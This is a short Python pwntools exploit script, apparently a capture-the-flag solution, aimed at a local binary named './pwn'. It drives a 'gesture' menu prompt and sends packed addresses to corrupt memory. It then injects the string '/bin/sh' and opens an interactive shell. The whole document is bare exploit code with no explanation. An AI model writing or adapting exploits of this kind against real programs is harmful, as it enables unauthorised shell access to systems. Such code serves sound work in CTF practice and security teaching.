from pwn import *
context(arch='amd64', os='linux')
io = process('./pwn')
for _ in range(8):
    io.sendlineafter(b'gesture: ', b'6')
io.sendlineafter(b'gesture: ', b'1')
io.sendafter(b'gesture? ', p64(0x401235) + p64(0x4040f8)[0:7])
io.sendlineafter(b'gesture: ', b'1')
io.sendlineafter(b'gesture? ', p64(0x401228) + b'/bin/sh')
io.sendlineafter(b'gesture: ', b'0')
io.interactive()
